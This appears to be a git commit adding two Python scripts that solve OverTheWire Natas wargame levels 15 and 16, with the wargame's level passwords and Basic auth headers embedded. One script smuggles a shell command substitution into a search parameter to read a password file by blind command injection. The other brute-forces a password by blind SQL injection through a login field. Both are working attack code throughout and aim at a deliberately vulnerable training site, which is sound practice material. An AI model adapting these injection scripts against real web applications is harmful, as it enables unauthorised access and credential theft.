79635f6c5afc365024993e48ce29b9e8e740bcf8
JonasBK <jonas.bulow@hotmail.com>
2018-08-23 22:39:56 +0200

    Scripts for blind code injection.

---
+++ src/blind_linux_via_php_injection.py
@@ -0,0 +1,50 @@
+'''
+Created on Aug 22, 2018
+
+source: https://www.abatchy.com/2016/11/natas-level-16
+'''
+
+import requests
+from requests.auth import HTTPBasicAuth
+ 
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+chars_in_passwd = list("")
+passwd = list("")
+ 
+# Find chars appearing in password
+for char in chars:    
+    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', 
+                      auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
+     
+    if ("doomed" not in r.text):       
+        chars_in_passwd.append(char)
+ 
+# Find password
+for i in range(0, 32):
+    for char in chars_in_passwd:
+        if len(passwd) == i:
+            passwd.append(char)
+        else:
+            passwd[i] = char
+         
+        passwd_str = "".join(passwd)
+        # ^: Line starts with the string
+        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd_str + ' /etc/natas_webpass/natas17)', 
+                          auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
+         
+        if ("doomed" not in r.text):       
+            break
+     
+    print("".join(passwd))
+        
+# REQUEST
+# GET /?needle=test HTTP/1.1
+# Host: natas16.natas.labs.overthewire.org
+# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+# Accept-Language: en-US,en;q=0.5
+# Accept-Encoding: gzip, deflate
+# Cookie: __cfduid=dfc19891ef710d8915a1f14a600ae2b271534787266; __utma=176859643.1042007831.1534787267.1534795773.1534850371.3; __utmz=176859643.1534787267.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643
+# Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==
+# Connection: close
+# Upgrade-Insecure-Requests: 1
---
+++ src/blind_sqli.py
@@ -0,0 +1,57 @@
+'''
+Created on Aug 22, 2018
+
+source: https://www.abatchy.com/2016/11/natas-level-14-and-15
+'''
+
+import requests
+from requests.auth import HTTPBasicAuth
+
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+chars_in_passwd = list("")
+passwd = list("")
+
+# Find chars appearing in password
+for char in chars:    
+    hack = "natas16\" and password like binary \"%{0}%".format(char) #binary: MySQL's way to make case sensitive
+    my_data = {"username": hack}       
+    r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", 
+                      data=my_data, 
+                      auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
+    
+    if ("This user exists" in r.text):       
+        chars_in_passwd.append(char)
+
+# Find password
+for i in range(0, 32):
+    for char in chars_in_passwd:
+        if len(passwd) == i:
+            passwd.append(char)
+        else:
+            passwd[i] = char
+        
+        passwd_str = "".join(passwd)
+        hack = "natas16\" and password like binary \"{0}%".format(passwd_str) #binary: MySQL's way to make case sensitive
+        my_data = {"username": hack}       
+        r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", 
+                          data=my_data, 
+                          auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
+        
+        if ("This user exists" in r.text):       
+            break
+    
+    print("".join(passwd))
+        
+# POST REQUEST
+# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+# Accept-Language: en-US,en;q=0.5
+# Accept-Encoding: gzip, deflate
+# Referer: http://natas15.natas.labs.overthewire.org/index.php
+# Cookie: __cfduid=dfc19891ef710d8915a1f14a600ae2b271534787266; __utma=176859643.1042007831.1534787267.1534795773.1534850371.3; __utmz=176859643.1534787267.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643
+# Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==
+# Connection: close
+# Upgrade-Insecure-Requests: 1
+# Content-Type: application/x-www-form-urlencoded
+# Content-Length: 39
+# username=natas16" and password="sometit
